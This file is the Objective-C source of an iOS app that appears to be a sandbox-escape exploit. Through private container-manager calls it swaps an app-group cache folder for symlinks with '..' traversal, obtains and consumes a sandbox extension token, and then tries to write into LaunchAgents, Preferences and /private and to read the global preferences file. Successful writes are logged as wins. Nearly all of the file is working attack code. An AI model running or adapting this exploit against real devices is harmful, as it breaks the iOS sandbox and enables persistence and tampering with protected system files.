// TRAV — part symlink with container-prefix + .. traversal to reach outside paths
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <string.h>
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);
static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group;
static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_free q_free;
static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_release xpc_release_fn;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid,*gRoot;
static void L(NSString *fmt, ...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[trav] %@",s);}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h)return NO;q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");return q_create&&q_get&&q_token&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static int64_t query(NSString**pathOut){void*q=q_create();q_class(q,7);void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;q_group(q,x);q_part(q,3);q_flags(q,0x8000000000ULL);void*res=q_get(q);const char*p=(res&&q_path)?q_path(res):NULL;char*tok=(res&&q_token)?q_token(res):NULL;int64_t h=(tok&&s_consume)?s_consume(tok):-5;if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;if(tok)free(tok);if(q_free)q_free(q);if(x&&xpc_release_fn)xpc_release_fn(x);return h;}
static void tw(NSString*tag,NSString*path){errno=0;int fd=open(path.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);int e=errno;if(fd>=0){write(fd,"TRAV",4);close(fd);L(@"[WIN %@] %@",tag,path);}else L(@"[w %@] errno=%d %@",tag,e,path);}
static void tre(NSString*tag,NSString*path){errno=0;int fd=open(path.fileSystemRepresentation,O_RDONLY);int e=errno;if(fd>=0){char b[64]={0};ssize_t n=read(fd,b,63);L(@"[r %@] fd=%d n=%zd %s",tag,fd,n,n>0?b:"");close(fd);}else L(@"[r %@] errno=%d %@",tag,e,path);}
static void testCase(NSString*tag,NSString*traversal,NSArray*writePaths){
    NSFileManager*fm=[NSFileManager defaultManager];[fm removeItemAtPath:gPart error:nil];
    int sr=symlink(traversal.fileSystemRepresentation,gPart.fileSystemRepresentation);
    if(sr){L(@"[case %@] symlink errno=%d",tag,errno);return;}
    NSString*p=nil;int64_t h=query(&p);
    L(@"[case %@] target=%@ token=%lld path=%@",tag,traversal,(long long)h,p?:@"(null)");
    if(h>=0){
        for(NSString*wp in writePaths){tw([tag stringByAppendingString:@"-direct"],wp);}
        NSString*via=[gPart stringByAppendingPathComponent:@"omni_trav_via"];tw([tag stringByAppendingString:@"-via"],via);
        if(s_release)s_release(h);
    }
}
static void run(void){@autoreleasepool{
    L(@"=== trav start uid=%d pid=%d",getuid(),getpid()); if(!loadMCM())return;
    gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
    gRoot=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
    gPart=[gRoot stringByAppendingPathComponent:@"Library/Caches"];
    gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSFileManager*fm=[NSFileManager defaultManager];[fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
    NSString*uuid=[gRoot lastPathComponent];
    NSString*agPrefix=[NSString stringWithFormat:@"/private/var/mobile/Containers/Shared/AppGroup/%@",uuid];
    NSString*sgPrefix=@"/private/var/containers/Data/System";
    NSArray*prefs=@[@"/private/var/mobile/Library/Preferences/omni_trav_prefs"];
    NSArray*la=@[@"/private/var/mobile/Library/LaunchAgents/omni_trav_la"];
    NSArray*lib=@[@"/private/var/mobile/Library/omni_trav_lib"];
    testCase(@"ag4-prefs",[agPrefix stringByAppendingString:@"/../../../../Library/Preferences"],prefs);
    testCase(@"ag4-la",[agPrefix stringByAppendingString:@"/../../../../Library/LaunchAgents"],la);
    testCase(@"ag4-lib",[agPrefix stringByAppendingString:@"/../../../../Library"],lib);
    testCase(@"sg4-prefs",[sgPrefix stringByAppendingString:@"/../../../../var/mobile/Library/Preferences"],prefs);
    testCase(@"sg4-la",[sgPrefix stringByAppendingString:@"/../../../../var/mobile/Library/LaunchAgents"],la);
    testCase(@"sg4-lib",[sgPrefix stringByAppendingString:@"/../../../../var/mobile/Library"],lib);
    testCase(@"sg5-private",[sgPrefix stringByAppendingString:@"/../../../../../"],@[@"/private/omni_trav_priv"]);
    testCase(@"sg5-var",[sgPrefix stringByAppendingString:@"/../../../../../var"],@[@"/private/var/omni_trav_var"]);
    testCase(@"ag5-private",[agPrefix stringByAppendingString:@"/../../../../../"],@[@"/private/omni_trav_priv2"]);
    testCase(@"ag5-mobile",[agPrefix stringByAppendingString:@"/../../../../../mobile"],@[@"/private/var/mobile/omni_trav_mob"]);
    tre(@"globalprefs-direct",@"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
    if(s_consume){}
    [fm removeItemAtPath:gPart error:nil];symlink(gValid.fileSystemRepresentation,gPart.fileSystemRepresentation);
    L(@"=== trav done ===");
}}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"TRAV";[vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];gPath=[[docs stringByAppendingPathComponent:@"trav.log"]copy];gLog=[NSMutableString new];L(@"=== trav launch ===");dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
